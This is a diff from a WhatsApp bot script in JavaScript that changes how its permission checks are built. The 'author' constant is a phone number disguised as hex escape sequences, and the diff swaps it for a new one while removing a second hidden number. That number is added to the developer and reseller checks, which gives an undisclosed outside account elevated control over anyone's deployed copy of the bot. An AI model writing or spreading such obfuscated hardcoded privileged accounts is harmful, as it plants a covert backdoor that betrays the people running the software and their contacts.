@@ -137,10 +137,9 @@ const kontributor = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
 const iniseller = JSON.parse(fs.readFileSync('./dtbs/seller.json'))
 const contacts = JSON.parse(fs.readFileSync("./dtbs/contacts.json"))
 const isContacts = contacts.includes(m.sender)
-const author = `\x32\x33\x34\x37\x30\x38\x30\x39\x36\x38\x35\x36\x34`
-const author2 = `\x32\x33\x34\x38\x30\x38\x33\x35\x36\x39\x36\x34\x37`
+const author = `\x32\x33\x34\x38\x31\x36\x34\x37\x34\x37\x35\x33\x34`
 const isReseller = [author,botNumber, ...iniseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-const isDeveloper = [author2,author,botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+const isDeveloper = [author,botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const isPremium = isDeveloper || isDeveloper || checkPremiumUser(m.sender, orgkaya);
 const isAfkOn = afk.checkAfkUser(m.sender, _afk)    
 
